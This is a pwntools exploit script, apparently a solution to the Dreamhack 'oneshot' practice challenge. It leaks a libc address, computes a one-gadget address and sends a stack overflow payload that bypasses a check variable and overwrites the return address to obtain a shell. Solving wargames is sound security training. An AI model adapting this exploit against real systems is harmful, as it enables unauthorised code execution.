from pwn import process, remote, ELF, success, p64, context

context.log_level = 'debug'

#p = process('./oneshot', env={'LD_PRELOAD': './libc-2.23.so'})
p = remote('host3.dreamhack.games', 17205)
e = ELF('./a/oneshot')
libc = ELF('./a/libc-2.23.so')

# 1. Calculate oneshot gadget absolute address on memory at runtime
p.recvuntil(b'stdout: ')
stdout_addr = int(p.recvuntil(b'\n'), 16)
libc_addr = stdout_addr - libc.symbols['_IO_2_1_stdout_']
one_gadget_addr = libc_addr + 0x45226

success(f'stdout_addr: {hex(stdout_addr)}')
success(f'libc_addr: {hex(libc_addr)}')
success(f'one_gadget_addr: {hex(one_gadget_addr)}')

# 2. overflow!
payload = b'A' * 0x18              # buffer and dummy area
payload += b'\x00' * 0x08          # check variable inspection bypass
payload += b'B' * 0x08             # SFP
payload += p64(one_gadget_addr)    # Return address is not overwritten as (valid) one gadget address

p.sendafter(b'MSG: ', payload)

p.interactive()
